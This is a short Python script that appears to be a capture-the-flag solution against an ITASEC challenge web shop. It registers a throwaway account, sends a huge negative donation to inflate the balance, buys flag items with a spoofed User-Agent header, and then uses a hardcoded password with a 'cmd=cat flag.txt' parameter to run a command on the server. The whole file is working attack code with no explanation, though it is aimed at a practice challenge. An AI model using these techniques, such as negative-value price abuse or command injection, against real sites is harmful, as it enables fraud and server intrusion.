# pip3 install requests
import requests
import secrets

BASE_URL = "http://itasecshop.challs.itasec.it"


def register():
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    session = requests.Session()
    session.post(BASE_URL + "/register",
                 data={"user": username, "psw": password}).text
    return session


def donate(session, price):
    session.post(BASE_URL + "/store/donate", data={"price": str(price)})


def buy(session, item):
    return session.post(BASE_URL + f"/store/{item}/buy", headers={'User-Agent': 'Samsung Smart Fridge 2.0'}).text


def main():
    session = register()
    donate(session, -100000000000000000)
    buy(session, 1)  # Flag 1
    buy(session, 5)  # Flag 2
    print("FLAG:", session.get(BASE_URL +
          "/cats?psw=---P4ssw0rd%24%24%24%24%24%24uperSicura%40%40%23%23%23%21meaw---&cmd=cat+flag.txt").text)


if __name__ == "__main__":
    main()
